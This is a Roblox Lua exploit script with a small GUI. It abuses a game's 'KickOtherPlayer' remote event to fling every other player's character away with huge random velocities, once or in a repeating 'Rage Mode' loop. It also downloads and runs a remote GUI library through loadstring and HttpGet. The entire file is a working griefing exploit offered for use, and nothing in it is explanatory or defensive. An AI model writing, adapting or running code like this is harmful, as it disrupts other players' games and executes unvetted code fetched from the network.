thisPlayer = game:GetService("Players").LocalPlayer
otherPlayer = game:GetService("Players")

local remote = game:GetService("ReplicatedStorage").Remotes.KickOtherPlayer
local rageMode
local customwait
local noOptions = true

local config = {
   ["HeaderWidth"] = 200,
   ['PrimaryColor'] = Color3.fromRGB(166, 167, 159),
   ['SecondaryColor'] = Color3.fromRGB(73, 103, 123),
   ["AccentColor"] = Color3.new(0.6,0,0)
}

--- GUI Setup ---
local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
local lpg = gui:CreateCategory("Player Options ",  UDim2.new(0, 400, 0, 100))
--- GUI Setup ---

--- Kicker Section ---
local kickOptions = lpg:CreateSection('Kicker Options')
local kickALL = kickOptions:CreateButton('Kick All Players', function() kicker() end)
local rage = kickOptions:CreateSwitch('Rage Mode', function(bool) rageMode = bool end)
local rage_slider = kickOptions:CreateSlider("Rage Mode Wait", function(value) noOptions = false customWait = value end,0,10,0.1,false,1)
local Exit = lpg:CreateButton("Exit",function() gui:CleanUp() end)
--- Kicker Section ---

--- Functions Setup ---

function kicker()
    for _, v in pairs(otherPlayer:GetPlayers()) do
        if v ~= thisPlayer then
            remote:FireServer({
                ["OtherCharacter"] = v.Character,
                ["LV"] = Vector3.new(math.random(5000), math.random(5000), math.random(5000))})
                --print('kicking '..v.name)
            end
        end
    end


function rageStart()
    for _, v in pairs(otherPlayer:GetPlayers()) do
        if v ~= thisPlayer then
            remote:FireServer({
                ["OtherCharacter"] = v.Character,
                ["LV"] = Vector3.new(math.random(5000), math.random(5000), math.random(5000))
                })
            end
        end
    end

while wait() do
    if rageMode == true and noOptions == true then
        spawn(rageStart)
    elseif rageMode == true and customWait > 0 then
        wait(customWait)
        spawn(rageStart)
    else
        noOptions = true
    end
end



